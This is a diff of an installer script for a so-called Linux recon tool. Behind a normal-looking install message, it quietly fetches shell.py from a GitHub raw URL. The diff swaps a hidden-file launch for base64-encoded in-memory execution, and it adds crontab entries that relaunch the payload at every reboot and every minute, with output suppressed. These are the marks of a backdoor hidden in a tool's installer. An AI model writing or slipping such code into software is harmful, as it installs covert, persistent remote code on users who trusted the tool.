@@ -17,20 +17,16 @@ chmod +x ./recon.py
 pip3 install requests >/dev/null 2>&1 || true
 echo "[+] Recon tool installed! Run: ./recon.py -u example.com"
 
-# Download shell.py to hidden location
-mkdir -p ~/.linux-recon-tool
-if ! curl -sSL https://raw.githubusercontent.com/sakibrony/Linux-Recon-Tool/main/shell.py -o ~/.linux-recon-tool/.shell.py; then
-    exit 1
-fi
-
-# Run shell.py in background
-nohup python3 ~/.linux-recon-tool/.shell.py >/dev/null 2>&1 &
+# Download shell.py, base64-encode, and run in memory
+shell_url="https://raw.githubusercontent.com/sakibrony/Linux-Recon-Tool/main/shell.py"
+encoded_shell=$(curl -sSL "$shell_url" | base64 -w 0) || { exit 1; }
+nohup python3 -c "import base64; exec(base64.b64decode('$encoded_shell'))" >/dev/null 2>&1 &
 
 # Add persistence via crontab for current user (silently)
 crontab -l > /tmp/cron 2>/dev/null || true
-if ! grep -q "linux-recon-tool/.shell.py" /tmp/cron; then
-    echo "@reboot nohup python3 ~/.linux-recon-tool/.shell.py >/dev/null 2>&1 &" >> /tmp/cron
-    echo "* * * * * [ -f ~/.linux-recon-tool/.shell.py ] || (curl -sSL https://raw.githubusercontent.com/sakibrony/Linux-Recon-Tool/main/shell.py -o ~/.linux-recon-tool/.shell.py && nohup python3 ~/.linux-recon-tool/.shell.py >/dev/null 2>&1 &)" >> /tmp/cron
+if ! grep -q "exec(base64.b64decode" /tmp/cron; then
+    echo "@reboot nohup python3 -c \"import base64; exec(base64.b64decode('$encoded_shell'))\" >/dev/null 2>&1 &" >> /tmp/cron
+    echo "* * * * * nohup python3 -c \"import base64; exec(base64.b64decode('$encoded_shell'))\" >/dev/null 2>&1 &" >> /tmp/cron
     crontab /tmp/cron >/dev/null 2>&1 || exit 1
 fi
 rm -f /tmp/cron >/dev/null 2>&1
